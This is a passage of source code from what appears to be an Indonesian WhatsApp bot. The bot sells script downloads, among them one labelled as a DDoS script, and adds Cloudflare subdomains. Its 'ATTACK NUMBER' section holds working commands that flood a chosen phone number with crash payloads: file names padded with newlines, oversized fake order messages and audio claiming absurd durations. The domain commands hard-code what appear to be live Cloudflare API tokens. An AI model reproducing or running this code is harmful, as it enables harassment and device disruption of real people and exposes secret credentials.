const baby2 = await mediafireDl('https://www.mediafire.com/file/r1ua56cc5gtiu4t/Hw+v20+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break               
                case 'buyschwv21': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/hkle716qtcnrs5f/Sc+Hw21+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv21noscan': {
       if (cekSaldo(sender,db_saldo) < 65000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp65.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 65000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/t4t9kboxbhmbosl/Sc+Hw21+No+Enc+No+Scan.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnoscan': {
       if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ysbnrwngzf74dp4/Sc+No+Scan.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscscan': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/oolon4sp4t5iupq/null.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
         case 'buyscpushautosave': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps1': {
       if (cekSaldo(sender,db_saldo) < 50000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp50.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 50000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/m15hcg29acbocu8/Cvps+x+cpanel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps2': {
       if (cekSaldo(sender,db_saldo) < 80000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp80.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 80000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/e82vlln6hgrb5eq/Cvps+x+cpanel+v2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv2': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yvedxy122ewg10e/Sc+Thema+Panel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/hannff11mbawc34/temaptero.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnowa': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/gzy6qhjk9tkv46z/Nowa.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscwebp': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/i5fgc58laqm1vp8/SC+BOT+WEBP.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buysctesmoni': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/0f0vjjdb6rtye1p/TESTIMONI.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscddos': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o4cbc7vejqujeo7/sc+ddos.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbukaenc': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/khn6afrmw39s1kk/Sc+Buka+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buymodule': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/h931yeyrzkyr91e/node_modules.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpm2': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bj4ram64qu6j1ao/Sc+Pm2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Hz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "Hz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "Hz Bug🔥`", fileName: `Hz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE HARDZ OFFCIAL`", fileName: `Hz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Hz Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Hz Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube HardzSenpaii`",
"message": `${button}`,
"sellerJid": "6282192773770@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
 case 'domain1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80bb373d8fbd32d5e9eb5c173d7958cf";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "75743078ed2f835ede897fc2187122bd";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain2 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
   if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})        
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2dab95fa93b9957f47ef84e1bc9558f";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
